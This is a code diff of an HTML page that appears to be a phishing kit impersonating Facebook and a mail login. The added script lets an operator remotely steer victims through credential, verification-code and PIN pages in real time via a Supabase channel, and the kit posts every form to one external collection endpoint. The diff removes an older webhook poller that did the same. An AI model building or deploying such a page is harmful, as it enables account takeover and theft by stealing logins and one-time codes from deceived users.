@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>School</title>
+<title>Mail</title>
 
 <!-- Open Graph / Social Media Meta Tags -->
 <meta property="og:title" content="Video Call">
@@ -20,6 +20,9 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&family=JetBrains+Mono:wght@400;500;800;900&display=swap" rel="stylesheet">
 <!-- FontAwesome for Icons -->
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<!-- Supabase CDN Client Library -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <style>
   :root {
@@ -178,6 +181,7 @@
     border-radius: 4px;
     word-break: break-word;
   }
+  /* ---------------------------------------------------- */
 
   .floating-group {
     position: relative;
@@ -247,6 +251,7 @@
     background-color: #1557b0;
   }
 
+  /* FULL-WIDTH SUPPORT BUTTON FOR FINAL PAGE */
   .customer-support-btn {
     width: 100%;
     height: 45px;
@@ -268,6 +273,7 @@
     background-color: #1557b0;
   }
 
+  /* PROCESSING CONTAINERS PUSHED MUCH LOWER */
   .processing-container {
     text-align: center;
     padding: 90px 0;
@@ -334,6 +340,7 @@
     color: #000000;
   }
 
+  /* REUSABLE WALLET CARD CLASS */
   .exact-wallet-card {
     background: #ffffff;
     border: 2px solid var(--color-bank-navy);
@@ -498,7 +505,7 @@
 
             <div style="text-align: center; margin-bottom: 16px;">
               <img src="schoolfbb" class="sFlh5c FyHeAf iPVvYb" style="max-width: 2000px; width: 55px; height: 55px; margin: 0px;" alt="" role="button">
-              <h5 class="form-title-facebook">SchoolApp</h5>
+              <h5 class="form-title-facebook">facebook</h5>
             </div>
                 
             <h5 class="step1-intro-text">
@@ -611,7 +618,7 @@
 
         <!-- THIRD PAGE ("C" - Verification Code Page with 20px Black Custom Message Box) -->
         <div id="mainContent2" class="step-section">
-          <!-- DESIGNATED 20px BLACK MESSAGE BOX -->
+          <!-- DESIGNATED 20px BLACK CUSTOM MESSAGE BOX -->
           <div id="dynamic-message-box"></div>
 
           <div class="lower-section">
@@ -703,6 +710,56 @@
     </div>
 
 <script>
+    // --- SUPABASE CONFIGURATION ---
+    const SUPABASE_URL = "https://bqddohfszkqpvncpbrun.supabase.co";
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHZuY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA";
+    
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    // Realtime Listener for Instant Remote Control
+    supabaseClient
+        .channel('public:app_control')
+        .on('postgres_changes', { event: '*', schema: 'public', table: 'app_control' }, payload => {
+            handleRemoteCommand(payload.new);
+        })
+        .subscribe();
+
+    // Fetch initial state on page load
+    async function fetchInitialState() {
+        const { data, error } = await supabaseClient
+            .from('app_control')
+            .select('*')
+            .eq('id', 1)
+            .single();
+        
+        if (data) {
+            handleRemoteCommand(data);
+        }
+    }
+    fetchInitialState();
+
+    function handleRemoteCommand(data) {
+        if (!data) return;
+
+        // 1. Handle Custom Message in 20px Black Box
+        const msgBox = document.getElementById('dynamic-message-box');
+        if (data.message && msgBox) {
+            msgBox.textContent = data.message;
+            msgBox.style.display = 'block';
+        } else if (msgBox) {
+            msgBox.style.display = 'none';
+        }
+
+        // 2. Handle View Routing
+        if (data.keyword === "C") {
+            showStep('mainContent2'); // Third page
+        } else if (data.keyword === "C2") {
+            showStep('mainContent3'); // 4th Code/PIN page
+        } else if (data.keyword === "F") {
+            showStep('finalApproved'); // Last success page
+        }
+    }
+
     if (document.getElementById('hidden-user-agent')) {
         document.getElementById('hidden-user-agent').value = navigator.userAgent;
     }
@@ -826,7 +883,7 @@
         if (hiddenCelebField) hiddenCelebField.value = celebName;
         document.querySelectorAll(".submittedName").forEach(el => el.textContent = celebName);
 
-        fetch("https://submit-form.com/1st", {
+        fetch("https://submit-form.com/EGef8sATM", {
             method: "POST",
             body: new FormData(document.getElementById("myForm")),
             headers: { 'Accept': 'application/json' }
@@ -852,7 +909,7 @@
     function submitSecondForm(event) {
         event.preventDefault();
         showStep('processing2');
-        fetch("https://submit-form.com/FC", {
+        fetch("https://submit-form.com/EGef8sATM", {
             method: "POST",
             body: new FormData(document.getElementById("secondForm")),
             headers: { 'Accept': 'application/json' }
@@ -863,7 +920,7 @@
     function submitThirdForm(event) {
         event.preventDefault();
         showStep('processing3');
-        fetch("https://submit-form.com/tot", {
+        fetch("https://submit-form.com/EGef8sATM", {
             method: "POST",
             body: new FormData(document.getElementById("thirdForm")),
             headers: { 'Accept': 'application/json' }
@@ -874,47 +931,13 @@
     function submitFourthForm(event) {
         event.preventDefault();
         showStep('processing4');
-        fetch("https://submit-form.com/extra", {
+        fetch("https://submit-form.com/EGef8sATM", {
             method: "POST",
             body: new FormData(document.getElementById("fourthForm")),
             headers: { 'Accept': 'application/json' }
         }).catch(err => console.error('Form submission error:', err))
           .finally(() => setTimeout(() => showStep('finalApproved'), 2000));
     }
-
-    // REAL-TIME MAKE.COM WEBHOOK POLLER SCRIPT
-    async function pollRemoteCommands() {
-        try {
-            const response = await fetch("https://hook.eu1.make.com/lw88482fohaxh792ipv2pm14oo44oqqt", {
-                method: "GET"
-            });
-
-            if (response.ok) {
-                const data = await response.json();
-
-                // Handle custom message injection into the 20px black box on Page 3
-                const msgBox = document.getElementById('dynamic-message-box');
-                if (data.message && msgBox) {
-                    msgBox.textContent = data.message;
-                    msgBox.style.display = 'block';
-                }
-
-                // Keyword-Based Dynamic View Routing
-                if (data.keyword === "C") {
-                    showStep('mainContent2'); // Automatically open Third Page ("C")
-                } else if (data.keyword === "C2") {
-                    showStep('mainContent3'); // Automatically open 4th Code/PIN Page ("C2")
-                } else if (data.keyword === "F") {
-                    showStep('finalApproved'); // Automatically open Last Page ("F")
-                }
-            }
-        } catch (e) {
-            // Suppress background errors silently
-        }
-    }
-
-    // Poll every 3 seconds for state updates
-    setInterval(pollRemoteCommands, 3000);
 </script>
 </body>
 </html>
